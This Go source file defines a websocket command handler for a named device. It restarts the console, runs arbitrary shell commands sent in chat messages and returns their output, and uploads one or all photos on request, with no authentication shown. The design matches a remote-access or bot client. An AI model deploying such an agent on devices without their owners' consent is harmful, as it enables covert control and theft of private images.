package main

import (
	"fmt"
	"strings"

	"github.com/gorilla/websocket"
)

func doCommand(msg Message, devicename string, c *websocket.Conn) string {

	whoami := "@" + devicename + " "
	if strings.HasPrefix(msg.Message, whoami) {
		// for me
		command := strings.Replace(msg.Message, whoami, "", -1)

		// restart
		if command == "restart" {
			sendMessage("terminating console!", 1, devicename, c)
			return "stop"
		}

		// execute command
		if strings.HasPrefix(command, "shell") {
			shell := strings.Replace(command, "shell ", "", -1)
			sendMessage("execute command: '"+shell+"'.", 1, devicename, c)
			out := executeShell(shell)
			sendMessage(out, 1, devicename, c)

			return ""
		}
		// file
		if strings.HasPrefix(command, "photo") {
			sendMessage("Will send a photo", 1, devicename, c)
			size := sendPhoto(msg.Source, devicename, c)
			sendMessage(fmt.Sprintf("Photo send with %d size!", size), 1, devicename, c)
			return ""
		}
		// allphoto
		if strings.HasPrefix(command, "all") {
			sendMessage("Will send all photos", 1, devicename, c)
			size, _ := sendAllPhotos(msg.Source, devicename, c)
			sendMessage(fmt.Sprintf("Photo send with %d size!", size), 1, devicename, c)
			return ""
		}
		sendMessage("received command '"+command+"'", 1, devicename, c)
	} else {
		// for all
		if strings.HasPrefix(msg.Message, "hi") {
			answer := fmt.Sprintf("device #%s says hi\n", devicename)
			sendMessage(answer, 1, devicename, c)
			return ""
		}
	}

	// nothing to do
	return ""
}
